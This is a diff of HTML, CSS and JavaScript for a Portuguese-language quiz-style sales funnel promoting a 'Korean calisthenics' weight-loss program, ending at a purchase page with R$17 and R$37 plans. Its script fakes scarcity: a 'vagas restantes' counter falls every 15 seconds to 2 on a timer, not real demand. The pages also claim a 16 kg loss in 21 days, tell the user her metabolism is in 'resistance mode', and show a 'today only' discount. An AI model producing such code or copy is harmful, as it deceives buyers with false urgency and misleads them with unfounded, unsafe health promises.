+        Quanto de água você bebe diariamente?
+    </h2>
+
+    <div class="options-list etapa22-options">
+
+        <button class="option-btn" data-value="Só café ou chá">
+            Eu só tomo café ou chá
+        </button>
+
+        <button class="option-btn" data-value="Cerca de 2 copos">
+            Cerca de 2 copos <br>(0,5 L)
+        </button>
+
+        <button class="option-btn" data-value="2 a 6 copos">
+            2 a 6 copos <br>(0,5–1,5 L)
+        </button>
+
+        <button class="option-btn" data-value="Mais de 6 copos">
+            Mais de 6 copos
+        </button>
+
+    </div>
+
+    <img
+        src="https://i.imgur.com/tbvOREN.png"
+        class="etapa22-image"
+        alt=""
+    >
+
+</div>
+
+<style>
+    .etapa22-wrapper{
+    position:relative;
+    min-height:820px;
+    overflow:hidden;
+}
+
+.etapa22-options{
+    width:50%;
+    position:relative;
+    z-index:20;
+}
+
+.etapa22-image{
+    position:absolute;
+    width:520px;
+    right:-90px;
+    top:160px;
+    z-index:1;
+    pointer-events:none;
+}
+
+@media(max-width:768px){
+
+    .etapa22-wrapper{
+        min-height:820px;
+    }
+
+    .etapa22-options{
+        width:50%;
+    }
+
+    .etapa22-image{
+        width:620px;
+        right:-220px;
+        top:150px;
+    }
+
+}
+</style>
+            <!-- ETAPA 23 (Pergunta): Quantas horas dorme -->
+            <div class="step-card" id="step-23" data-type="single">
+                <div class="step-image-container text-center rounded-img-container mb-3">
+                                    <h2 class="step-title text-center">Quantas horas você costuma dormir?</h2>
+                    <img src="https://i.imgur.com/h1EHsG7.png" alt="Mulher dormindo" class="banner-img">
+                </div>
+                <div class="options-grid-2x2 mt-3">
+                    <button class="option-grid-text-btn" data-value="Menos de 5 horas">Menos de 5 horas</button>
+                    <button class="option-grid-text-btn" data-value="5-6 horas">5-6 horas</button>
+                    <button class="option-grid-text-btn" data-value="7-8 horas">7-8 horas</button>
+                    <button class="option-grid-text-btn" data-value="Mais de 8 horas">Mais de 8 horas</button>
+                </div>
+            </div>
+            <!-- ETAPA 24 (Pergunta - Multi-seleção): Preferências de refeição -->
+            <div class="step-card" id="step-24" data-type="multi">
+                <h2 class="step-title text-center">Quais são suas preferências de refeição?</h2>
+                <div class="options-list mt-3">
+                    <div class="option-checkbox-img-row" data-value="Vegetariana">
+                        <img src="https://i.imgur.com/3tLYjZ7.png" alt="Vegetariana" class="row-thumb">
+                        <div class="row-label-container">
+                            <span class="row-label-main">Eu sou vegetariana</span>
+                            <span class="row-label-sub">Verduras, grãos, mas sem carne animal</span>
+                        </div>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img-row" data-value="Vegana">
+                        <img src="https://i.imgur.com/2fQew8S.png" alt="Vegana" class="row-thumb">
+                        <div class="row-label-container">
+                            <span class="row-label-main">Eu sou vegana</span>
+                            <span class="row-label-sub">Puramente à base de plantas, sem produtos animais</span>
+                        </div>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img-row" data-value="Sem glúten">
+                        <img src="https://i.imgur.com/vjOobod.png" alt="Sem glúten" class="row-thumb">
+                        <div class="row-label-container">
+                            <span class="row-label-main">Não contém glúten</span>
+                            <span class="row-label-sub">Exclua produtos de grãos que contenham glúten</span>
+                        </div>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img-row" data-value="Sem lactose">
+                        <img src="https://i.imgur.com/zTi63xD.png" alt="Sem lactose" class="row-thumb">
+                        <div class="row-label-container">
+                            <span class="row-label-main">Sem lactose</span>
+                            <span class="row-label-sub">Excluir produtos lácteos</span>
+                        </div>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img-row" data-value="Sem restrições">
+                        <img src="https://i.imgur.com/dLc4Vq1.png" alt="Sem restrições" class="row-thumb">
+                        <div class="row-label-container">
+                            <span class="row-label-main">Sem restrições</span>
+                            <span class="row-label-sub">Aberto a todos os alimentos</span>
+                        </div>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next-multi" disabled>Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 25 (Pergunta - Multi-seleção): Hábitos -->
+            <div class="step-card" id="step-25" data-type="multi">
+                <h2 class="step-title text-center">Quais desses hábitos você tem?</h2>
+                <div class="options-list mt-3">
+                    <div class="option-checkbox-row" data-value="Procrastinação">
+                        <span class="emoji-icon">⏰</span>
+                        <span class="option-label">Procrastinação</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Alimentação ruim">
+                        <span class="emoji-icon">🍔</span>
+                        <span class="option-label">Alimentação pouco saudável</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Mídias sociais">
+                        <span class="emoji-icon">📱</span>
+                        <span class="option-label">Mídias sociais</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Muita cafeína">
+                        <span class="emoji-icon">☕</span>
+                        <span class="option-label">Beber muita cafeína</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Maratona de séries">
+                        <span class="emoji-icon">📺</span>
+                        <span class="option-label">Maratona de séries</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Dúvida sobre si">
+                        <span class="emoji-icon">💭</span>
+                        <span class="option-label">Dúvida sobre si mesmo</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Roer as unhas">
+                        <span class="emoji-icon">🖐️</span>
+                        <span class="option-label">Roer as unhas</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Estar atrasada">
+                        <span class="emoji-icon">⏳</span>
+                        <span class="option-label">Estar atrasada</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Fumar">
+                        <span class="emoji-icon">🚬</span>
+                        <span class="option-label">Fumar</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next-multi" disabled>Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 26 (Pergunta - Multi-seleção): Ganho de peso -->
+            <div class="step-card" id="step-26" data-type="multi">
+                <h2 class="step-title text-center">Algum dos eventos abaixo te levou a ganhar peso nos últimos anos?</h2>
+                <div class="options-list mt-3">
+                    <div class="option-checkbox-row" data-value="Casamento">
+                        <span class="emoji-icon">❤️</span>
+                        <span class="option-label">Casamento ou relacionamento</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Gravidez">
+                        <span class="emoji-icon">📅</span>
+                        <span class="option-label">Gravidez</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Trabalho ou Família">
+                        <span class="emoji-icon">💼</span>
+                        <span class="option-label">Trabalho agitado ou vida familiar</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Estresse">
+                        <span class="emoji-icon">🧠</span>
+                        <span class="option-label">Estresse ou saúde mental</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Medicamentos">
+                        <span class="emoji-icon">💊</span>
+                        <span class="option-label">Medicamento ou distúrbio hormonal</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-row" data-value="Nenhuma">
+                        <span class="emoji-icon">❌</span>
+                        <span class="option-label">Nenhuma das acima</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next-multi" disabled>Próximo passo</button>
+                </div>
+            </div>
+            <!-- ETAPA 27 (Informativa): Recupere seu corpo -->
+            <div class="step-card" id="step-27" data-type="info">
+                <div class="step-image-container text-center rounded-img-container">
+                    <img src="https://i.imgur.com/1H4kRKW.png" alt="Mulher feliz" class="banner-img">
+                </div>
+                <h2 class="step-title text-center mt-3">Recupere Seu Corpo!</h2>
+                <p class="step-text text-center mt-2">
+                    Não sabe por onde começar? Nós já planejamos tudo. Não tem certeza de que pode fazer isso? Estamos prontos para motivá-la e apoiá-la!
+                </p>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next">Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 28 (Informativa - Gráfico): Gráfico de Transformação -->
+            <div class="step-card" id="step-28" data-type="info">
+                <h2 class="step-title text-center">É assim que a <span>transformação <br>da sua vida</span> se parece</h2>
+                <p class="step-text text-center text-secondary">Com base nas suas respostas, prevemos que você está entre as mulheres com mais chances de atingir seus objetivos!</p>
+                
+                <!-- Gráfico de Linha Vetorial (SVG) -->
+                <div class="chart-container mt-4">
+                    <svg class="transformation-chart" viewBox="0 0 400 200">
+                        <defs>
+                            <linearGradient id="green-grad" x1="0%" y1="0%" x2="0%" y2="100%">
+                                <stop offset="0%" stop-color="#4caf50" stop-opacity="0.3"/>
+                                <stop offset="100%" stop-color="#4caf50" stop-opacity="0.0"/>
+                            </linearGradient>
+                            <linearGradient id="red-grad" x1="0%" y1="0%" x2="0%" y2="100%">
+                                <stop offset="0%" stop-color="#f44336" stop-opacity="0.2"/>
+                                <stop offset="100%" stop-color="#f44336" stop-opacity="0.0"/>
+                            </linearGradient>
+                        </defs>
+                        <!-- Linhas de Base -->
+                        <line x1="40" y1="120" x2="360" y2="120" stroke="#eee" stroke-dasharray="4"/>
+                        
+                        <!-- Preenchimentos de Área -->
+                        <path d="M 40 120 L 360 40 L 360 120 Z" fill="url(#green-grad)" />
+                        <path d="M 40 120 L 360 170 L 360 120 Z" fill="url(#red-grad)" />
+                        <!-- Linha de Sucesso (Verde) -->
+                        <path d="M 40 120 Q 200 80, 360 40" fill="none" stroke="#4caf50" stroke-width="4" stroke-linecap="round"/>
+                        <!-- Linha Sem Mudanças (Vermelho) -->
+                        <path d="M 40 120 Q 200 145, 360 170" fill="none" stroke="#f44336" stroke-width="4" stroke-linecap="round"/>
+                        <!-- Pontos -->
+                        <circle cx="40" cy="120" r="6" fill="#5b6bd6"/>
+                        <circle cx="360" cy="40" r="6" fill="#4caf50"/>
+                        <circle cx="360" cy="170" r="6" fill="#f44336"/>
+                        
+                        <!-- Badges Informativos -->
+                        <foreignObject x="10" y="80" width="70" height="35">
+                            <div class="chart-badge user-badge">Você</div>
+                        </foreignObject>
+                        <foreignObject x="195" y="10" width="165" height="35">
+                            <div class="chart-badge success-badge">Com Calistenia Coreana</div>
+                        </foreignObject>
+                        <foreignObject x="245" y="125" width="115" height="35">
+                            <div class="chart-badge danger-badge">Sem mudanças</div>
+                        </foreignObject>
+                    </svg>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next">Continuar</button>
+                </div>
+            </div>
+<!-- ETAPA 29 (Carregamento / Loading): Criando Plano -->
+<div class="step-card" id="step-29" data-type="loading">
+
+    <h2 class="step-title text-center">
+        Aguarde, estamos criando seu plano personalizado
+    </h2>
+
+    <div class="loading-progress-container mt-4">
+        <div id="loading-bar-fill" class="loading-bar-fill" style="width:0%;"></div>
+    </div>
+
+    <div class="loading-percentage-display text-center mt-2">
+        <span id="loading-pct-number">0</span>%
+    </div>
+
+    <div class="step-image-container text-center mt-4 rounded-img-container">
+
+        <img
+            id="loading-image"
+            src="https://i.imgur.com/fE2V2WR.png"
+            alt="Transformação"
+            class="banner-img"
+        >
+
+        <p class="image-caption-text mt-2 text-secondary">
+            Resultados reais de usuárias do programa.
+        </p>
+
+    </div>
+
+</div>
+
+            <!-- ETAPA 30 (Informativa - Projeção de Peso): Meta de peso -->
+            <div class="step-card" id="step-30" data-type="info">
+                <h2 class="step-title text-center">O último plano que você precisará para ficar em forma</h2>
+                
+                <!-- Caixa de Projeção Dinâmica -->
+                <div class="projection-highlight-box mt-3 text-center">
+                    Prevemos que você estará com <br><span class="highlight-target-w" id="proj-target-weight">57kg</span> em até 21 dias
+                </div>
+                <!-- Gráfico de Redução de Peso (SVG) -->
+                <div class="chart-container mt-4">
+                    <svg class="weight-loss-chart" viewBox="0 0 400 200">
+                        <defs>
+                            <linearGradient id="weight-loss-grad" x1="0%" y1="0%" x2="0%" y2="100%">
+                                <stop offset="0%" stop-color="#ff9800" stop-opacity="0.3"/>
+                                <stop offset="100%" stop-color="#ff9800" stop-opacity="0.0"/>
+                            </linearGradient>
+                        </defs>
+                        <!-- Área de Perda de Peso -->
+                        <path d="M 40 50 L 360 150 L 360 180 L 40 180 Z" fill="url(#weight-loss-grad)"/>
+                        
+                        <!-- Curva de Emagrecimento -->
+                        <path d="M 40 50 Q 200 80, 360 150" fill="none" stroke="#ff9800" stroke-width="4" stroke-linecap="round"/>
+                        <!-- Pontos e Destaques -->
+                        <circle cx="40" cy="50" r="6" fill="#5b6bd6"/>
+                        <circle cx="200" cy="88" r="5" fill="#5b6bd6"/>
+                        <circle cx="360" cy="150" r="6" fill="#4caf50"/>
+                        <!-- Valores sobre os pontos -->
+                        <foreignObject x="10" y="15" width="80" height="35">
+                            <div class="chart-weight-lbl current-lbl" id="proj-start-weight-badge">73kg</div>
+                        </foreignObject>
+                        <foreignObject x="160" y="55" width="80" height="35">
+                            <div class="chart-weight-lbl week-lbl">Semana 2</div>
+                        </foreignObject>
+                        <foreignObject x="320" y="115" width="80" height="35">
+                            <div class="chart-weight-lbl target-lbl" id="proj-target-weight-badge">57kg</div>
+                        </foreignObject>
+                    </svg>
+                </div>
+                <p class="step-text text-center mt-3 font-semibold">Protocolo de 21 dias quase pronto!</p>
+                <p class="step-text text-center text-secondary">De acordo com as suas respostas, você está pronta para ter resultados em 21 dias com o nosso programa.</p>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next">Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 31 (Resultados / Perfil): Alerta de Bloqueio -->
+            <div class="step-card" id="step-31" data-type="info">
+                <h2 class="step-title text-center">Seu perfil está pronto</h2>
+                
+                <!-- Escala de IMC -->
+                <div class="imc-gauge-card mt-3">
+                    <h3 class="gauge-title text-center">Índice de Massa Corporal (IMC)</h3>
+                    <div class="gauge-bar-outer">
+                        <div class="gauge-pointer-wrapper" id="imc-gauge-pointer-wrap" style="left: 60%;">
+                            <div class="gauge-pointer-label" id="imc-gauge-lbl">Você - 26.8</div>
+                            <div class="gauge-pointer-arrow"></div>
+                        </div>
+                        <div class="gauge-bar-fill"></div>
+                    </div>
+                    <div class="gauge-labels">
+                        <span>Abaixo do peso</span>
+                        <span>Normal</span>
+                        <span>Sobrepeso</span>
+                        <span>Obeso</span>
+                    </div>
+                </div>
+                <!-- Alerta de Bloqueio -->
+                <div class="lock-alert-card mt-4">
+                    <div class="lock-alert-header">
+                        <span class="warning-icon">⚠️</span>
+                        <span class="lock-alert-title">Alerta de Bloqueio:</span>
+                    </div>
+                    <p class="lock-alert-text">
+                        Seu metabolismo entrou em modo de resistência. O excesso de peso está sobrecarregando suas articulações e travando sua energia diária. O segredo para voltar a secar é a ativação rítmica das fibras profundas, que derrete a gordura mais difícil sem o esforço exaustivo da academia.
+                    </p>
+                </div>
+                <!-- Lista de Parâmetros Coletados -->
+                <div class="profile-metrics-list mt-4">
+                    <div class="metric-row">
+                        <span class="metric-icon">📈</span>
+                        <div class="metric-info">
+                            <span class="metric-label">Estilo de vida</span>
+                            <span class="metric-value" id="profile-lifestyle">Sedentário</span>
+                        </div>
+                    </div>
+                    <div class="metric-row">
+                        <span class="metric-icon">👤</span>
+                        <div class="metric-info">
+                            <span class="metric-label">Nível de condicionamento</span>
+                            <span class="metric-value">Iniciante</span>
+                        </div>
+                    </div>
+                    <div class="metric-row">
+                        <span class="metric-icon">🔥</span>
+                        <div class="metric-info">
+                            <span class="metric-label">Metabolismo</span>
+                            <span class="metric-value">Em resistência, difícil queimar gordura</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next">Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 32 (Pergunta): Principal motivo para transformar -->
+            <div class="step-card" id="step-32" data-type="single">
+                <h2 class="step-title text-center">Qual é o seu principal motivo para transformar o seu corpo?</h2>
+                <div class="options-list mt-3">
+                    <button class="option-btn-icon-row" data-value="Confiança">
+                        <span class="icon-circle">✨</span>
+                        <span class="option-label">Me sentir mais confiante com o meu corpo.</span>
+                        <span class="arrow-indicator">›</span>
+                    </button>
+                    <button class="option-btn-icon-row" data-value="Saúde">
+                        <span class="icon-circle">⚡</span>
+                        <span class="option-label">Ficar mais saudável e ter mais energia.</span>
+                        <span class="arrow-indicator">›</span>
+                    </button>
+                    <button class="option-btn-icon-row" data-value="Roupas">
+                        <span class="icon-circle">👗</span>
+                        <span class="option-label">Me sentir bem nas minhas roupas.</span>
+                        <span class="arrow-indicator">›</span>
+                    </button>
+                    <button class="option-btn-icon-row" data-value="Pós-parto">
+                        <span class="icon-circle">👶</span>
+                        <span class="option-label">Recuperar o corpo e a autoestima após o parto.</span>
+                        <span class="arrow-indicator">›</span>
+                    </button>
+                    <button class="option-btn-icon-row" data-value="Outro">
+                        <span class="icon-circle">•••</span>
+                        <span class="option-label">Outro.</span>
+                        <span class="arrow-indicator">›</span>
+                    </button>
+                </div>
+            </div>
+            <!-- ETAPA 33 (Pergunta): Quão confiante -->
+            <div class="step-card" id="step-33" data-type="single">
+                <h2 class="step-title text-center">Quão confiante você está em entrar em forma até o dia <span id="conf-dynamic-date" class="color-highlight">08 de julho</span>?</h2>
+                <div class="options-list mt-3">
+                    <button class="option-btn-icon-row" data-value="Consigo">
+                        <span class="icon-circle">🚀</span>
+                        <span class="option-label">Eu sei que consigo!</span>
+                        <span class="arrow-indicator">›</span>
+                    </button>
+                    <button class="option-btn-icon-row" data-value="Disposta">
+                        <span class="icon-circle">✨</span>
+                        <span class="option-label">Estou disposta a tentar algo novo!</span>
+                        <span class="arrow-indicator">›</span>
+                    </button>
+                    <button class="option-btn-icon-row" data-value="Insegura">
+                        <span class="icon-circle">❤️</span>
+                        <span class="option-label">Ainda sinto insegurança, mas quero mudar!</span>
+                        <span class="arrow-indicator">›</span>
+                    </button>
+                </div>
+            </div>
+            <!-- ETAPA 34 (Resumo do Plano): Comparativo Agora vs Objetivo -->
+            <div class="step-card" id="step-34" data-type="info">
+                <h2 class="step-title text-center">Seu plano de Calistenia Coreana <br>está <span class="color-highlight">Quase</span> pronto!</h2>
+                
+                <!-- Quadro Comparativo -->
+                <div class="comparison-card mt-3">
+                    <div class="comparison-columns">
+                        <!-- Coluna AGORA -->
+                        <div class="comp-col">
+                            <h4 class="comp-title">Agora</h4>
+                            <div class="comp-img-wrap">
+                                <img src="https://i.imgur.com/H5uLzPH.png" alt="Agora">
+                            </div>
+                            <div class="comp-metric mt-2">
+                                <span class="comp-label">Peso atual</span>
+                                <strong class="comp-value" id="comp-start-w">73 kg</strong>
+                            </div>
+                            <div class="comp-metric">
+                                <span class="comp-label">Gordura corporal</span>
+                                <strong class="comp-value color-highlight" id="comp-fat-status">Acima do normal</strong>
+                            </div>
+                            <div class="comp-metric">
+                                <span class="comp-label">Treino de calistenia</span>
+                                <div class="comp-bar-lvl">
+                                    <span class="bar-fill filled"></span>
+                                    <span class="bar-fill"></span>
+                                    <span class="bar-fill"></span>
+                                </div>
+                                <strong class="comp-value">Iniciante</strong>
+                            </div>
+                        </div>
+                        <!-- Ícone de Transição Central -->
+                        <div class="comp-divider">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#5b6bd6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="13 17 18 12 13 7"></polyline><polyline points="6 17 11 12 6 7"></polyline></svg>
+                        </div>
+                        <!-- Coluna OBJETIVO -->
+                        <div class="comp-col">
+                            <h4 class="comp-title">Seu objetivo</h4>
+                            <div class="comp-img-wrap">
+                                <img src="https://i.imgur.com/CUgnYsE.png" alt="Objetivo">
+                            </div>
+                            <div class="comp-metric mt-2">
+                                <span class="comp-label">Peso desejado</span>
+                                <strong class="comp-value color-green" id="comp-target-w">57 kg</strong>
+                            </div>
+                            <div class="comp-metric">
+                                <span class="comp-label">Gordura corporal</span>
+                                <strong class="comp-value color-green">Normal</strong>
+                            </div>
+                            <div class="comp-metric">
+                                <span class="comp-label">Treino de calistenia</span>
+                                <div class="comp-bar-lvl">
+                                    <span class="bar-fill filled"></span>
+                                    <span class="bar-fill filled"></span>
+                                    <span class="bar-fill filled"></span>
+                                </div>
+                                <strong class="comp-value">Avançado</strong>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Cards de Foco e Detalhes do Plano -->
+                <div class="plan-details-list mt-4">
+                    <div class="plan-info-card">
+                        <span class="info-card-icon">🎯</span>
+                        <div class="info-card-content">
+                            <strong>Foco do Protocolo:</strong> Autoestima e confiança corporal.
+                        </div>
+                    </div>
+                    <div class="plan-info-card">
+                        <span class="info-card-icon">📅</span>
+                        <div class="info-card-content">
+                            Sua mentalidade forte acelerará a ativação das fibras profundas. Sua primeira grande transformação está prevista para o dia <strong id="plan-dynamic-date">08 de julho</strong>.
+                        </div>
+                    </div>
+                    <div class="plan-info-card">
+                        <span class="info-card-icon">🧘‍♀️</span>
+                        <div class="info-card-content">
+                            Método sem impacto — seguro para qualquer idade e condição física.
+                        </div>
+                    </div>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next" id="btn-finish-quiz">CONTINUAR</button>
+                </div>
+            </div>
+            <!-- ETAPA 35 (Tela Final - VSL): Página de Compra da VSL (VTURB) -->
+<div class="step-card" id="step-35" data-type="vsl">
+
+    <!-- Headline -->
+    <h2 class="step-title text-center s35-headline">
+        Seu plano de Calistenia Coreana <br>está pronto!
+    </h2>
+
+    <p class="step-subtitle text-center s35-subheadline">
+        Assista ao vídeo abaixo para entender como funciona...
+    </p>
+
+    <!-- VSL -->
+    <div class="vsl-container s35-vsl">
+        <vturb-smartplayer id="vid-6aaf3134d4183d52da4067e5" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"></vturb-smartplayer>
+        <!--
+            ⚠️ IMPORTANTE: o script do player VTURB NÃO é carregado aqui de propósito.
+            Ele é injetado dinamicamente APENAS quando o usuário chega na etapa 35
+            (veja a função loadVSL() no bloco "LÓGICA DA ETAPA 35" no final do arquivo).
+            Assim a VSL só começa a tocar quando a etapa 35 ficar visível, e não
+            no início do quiz.
+        -->
+    </div>
+
+    <div class="s35-offer-block" id="s35-offer-block" style="display:none;">
+
+        <!-- CTA 1 -->
+<!-- CTA 1 -->
+<div class="offer-btn-wrap">
+    <a href="#s35-plans" class="offer-btn" data-offer-plans>ESCOLHER MEU PLANO</a>
+</div>
+
+<div class="vagas-alerta">
+    <span class="vagas-fire">🔥</span>
+
+    <span>
+        Restam apenas <strong id="vagas-restantes">12</strong> vagas
+    </span>
+</div>
+
+<style>
+.vagas-alerta {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+
+    font-family: 'Poppins', sans-serif;
+    font-size: 14px;
+    font-weight: 600;
+
+    color: #ff5a00;
+    text-align: center;
+}
+
+.vagas-fire {
+    width: 16px;
+    height: 16px;
+    flex-shrink: 0;
+    color: #ff5a00;
+}
+
+#vagas-restantes {
+    font-weight: 700;
+}
+</style>
+
+<script>
+(function () {
+
+    const etapaFinal = document.getElementById("step-35");
+
+    if (!etapaFinal) return;
+
+    const VAGAS_INICIAIS = 12;
+    const VAGAS_MINIMAS = 2;
+
+    // Tempo para diminuir 1 vaga
+    // 15000 = 15 segundos
+    const INTERVALO = 15000;
+
+    let vagas = VAGAS_INICIAIS;
+    let contador = null;
+    let contadorIniciado = false;
+
+
+    // Atualiza TODOS os contadores existentes na página
+    function atualizarVagas() {
+
+        // Contador acima de "O que você vai receber?"
+        const contadorPrincipal = document.getElementById("vagas-restantes");
+
+        if (contadorPrincipal) {
+            contadorPrincipal.textContent = vagas;
+        }
+
+
+        // Contadores acima de "Acesso especial e único"
+        const contadoresEspelho = document.querySelectorAll(".vagas-espelho");
+
+        contadoresEspelho.forEach(function (elemento) {
+            elemento.textContent = vagas;
+        });
+
+    }
+
+
+    // Mostra inicialmente 12 em todos
+    atualizarVagas();
+
+
+    function iniciarContador() {
+
+        if (contadorIniciado) return;
+
+        contadorIniciado = true;
+
+        // Atualiza novamente porque agora todos os elementos
+        // da etapa 35 já existem no HTML
+        atualizarVagas();
+
+
+        contador = setInterval(function () {
+
+            if (vagas > VAGAS_MINIMAS) {
+
+                vagas--;
+
+                atualizarVagas();
+
+            }
+
+
+            if (vagas <= VAGAS_MINIMAS) {
+
+                clearInterval(contador);
+                contador = null;
+
+            }
+
+        }, INTERVALO);
+
+    }
+
+
+    function verificarEtapaFinal() {
+
+        if (etapaFinal.classList.contains("active")) {
+
+            iniciarContador();
+
+        }
+
+    }
+
+
+    // Observa quando o usuário chega na etapa 35
+    const observer = new MutationObserver(function () {
+
+        verificarEtapaFinal();
+
+    });
+
+
+    observer.observe(etapaFinal, {
+        attributes: true,
+        attributeFilter: ["class"]
+    });
+
+
+    // Caso a etapa 35 já esteja aberta
+    verificarEtapaFinal();
+
+})();
+</script>
+
+<style>
+    .offer-btn-wrap{
+    width:100%;
+    margin:20px 0;
+}
+
+.offer-btn{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    width:100%;
+    min-height:58px;
+
+    background:#5b6bd6;
+    color:#fff !important;
+
+    border:none;
+    border-radius:14px;
+
+    font-family:'Poppins',sans-serif;
+    font-size:18px;
+    font-weight:700;
+
+    text-align:center;
+    text-decoration:none !important;
+
+    padding:16px 24px;
+    box-sizing:border-box;
+
+    box-shadow:0 6px 18px rgba(91,107,214,.35);
+
+    transition:.2s;
+}
+
+.offer-btn:hover{
+    background:#4A58C4;
+    color:#fff !important;
+    text-decoration:none !important;
+}
+
+.offer-btn:visited{
+    color:#fff !important;
+    text-decoration:none !important;
+}
+
+.offer-btn:active{
+    transform:scale(.98);
+}
+</style>
+
+<br>
+<!-- Benefícios -->
+
+<h2 class="benefits-title">O que você vai receber?</h2>
+
+<div class="benefits-list">
+    <div class="benefit-item">
+        <strong>✅ Ativação das Fibras Profundas:</strong> o segredo coreano para destravar o metabolismo e queimar gordura de verdade, sem precisar se matar na academia.
+    </div>
+
+    <div class="benefit-item">
+        <strong>✅ Cronograma "Barriga Chapada" em 21 Dias:</strong> um passo a passo diário e direto ao ponto para você saber exatamente o que fazer.
+    </div>
+
+    <div class="benefit-item">
+        <strong>✅ Guia de Alimentação Metabólica:</strong>  receitas práticas e gostosas para acelerar a queima de gordura enquanto você descansa.
+    </div>
+
+    <div class="benefit-item">
+        <strong>✅ Recuperação e Alívio Articular:</strong> exercícios suaves e sem impacto feitos para fortalecer suas articulações e eliminar dores enquanto você elimina peso.
+    </div>
+
+    <div class="benefit-item">
+        <strong>✅ Explosão de Vitalidade:</strong> técnicas de ativação que combatem o cansaço constante e devolvem sua disposição logo nos primeiros dias.
+    </div>
+
+    <div class="benefit-item">
+        <strong>✅ Suporte via WhatsApp:</strong> acompanhamento direto para tirar dúvidas e manter sua motivação no protocolo.
+    </div>
+</div>
+
+<style>
+.benefits-title {
+    width: 100%;
+    text-align: center;
+    font-family: 'Poppins', sans-serif;
+    font-size: 18px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin: 0 0 18px 0;
+}
+</style>
+
+        <!-- Mockup App -->
+        <div class="s35-app-mockup">
+            <img src="https://i.imgur.com/s19rMnb.png" alt="Aplicativo Calistenia Asiática">
+        </div>
+
+        <!-- Oferta -->
+        <div class="offer-box s35-offer-box">
+
+<div class="vagas-oferta">
+    🔥 Restam apenas <strong class="vagas-espelho">12</strong> vagas
+</div>
+
+
+
+            <div class="s35-offer-badge">Acesso imediato após o pagamento!</div>
+            <div class="s35-plans" id="s35-plans" tabindex="-1">
+    <article class="s35-plan">
+        <h3>Plano Básico</h3>
+        <div class="new-price">R$ 17,00</div>
+        <p class="installments">Pagamento único</p>
+        <ul class="s35-plan-features">
+    <li>Plano de 21 dias</li>
+    <li>Programa de Calistenia Coreana</li>
+    <li>Treinos de 7 minutos por dia</li>
+    <li>Vídeos passo a passo</li>
+    <li>Acesso imediato</li>
+</ul>
+        <button type="button" class="offer-btn s35-basic-btn" id="s35-basic-open" aria-haspopup="dialog" aria-controls="s35-premium-modal">QUERO COMEÇAR POR R$ 17</button>
+    </article>
+    <article class="s35-plan s35-plan-premium">
+        <span class="s35-plan-badge">MAIS ESCOLHIDO</span>
+        <h3>Plano Premium</h3>
+        <div class="new-price">R$ 37,00</div>
+        <p class="installments">Pagamento único</p>
+        <ul class="s35-plan-features">
+    <li>Tudo do Plano Básico</li>
+    <li>Protocolo Cintura K</li>
+    <li>Glúteo K-Shape</li>
+    <li>Treinos Zero Impacto</li>
+    <li>K-Food 21</li>
+    <li>Diário de Transformação</li>
+    <li>Bônus exclusivos</li>
+    <li>Atualizações futuras</li>
+    <li>Acesso vitalício</li>
+</ul>
+        <a class="offer-btn" data-offer-checkout="premium37">🔥 QUERO TUDO POR R$ 37</a>
+    </article>
+</div>
+
+<div class="desconto-hoje">
+    <strong>Desconto válido apenas hoje</strong> <span id="data-desconto"></span>
+</div>
+
+<style>
+.desconto-hoje {
+    text-align: center;
+    font-family: 'Poppins', sans-serif;
+    font-size: 14px;
+    color: #1a1a1a;
+    white-space: nowrap;
+
+    margin-top: 10px;
+}
+
+.desconto-hoje strong {
+    font-weight: 700;
+}
+
+#data-desconto {
+    font-weight: 700;
+}
+</style>
+
+<style>
+.vagas-oferta {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 4px;
+
+    font-family: 'Poppins', sans-serif;
+    font-size: 14px;
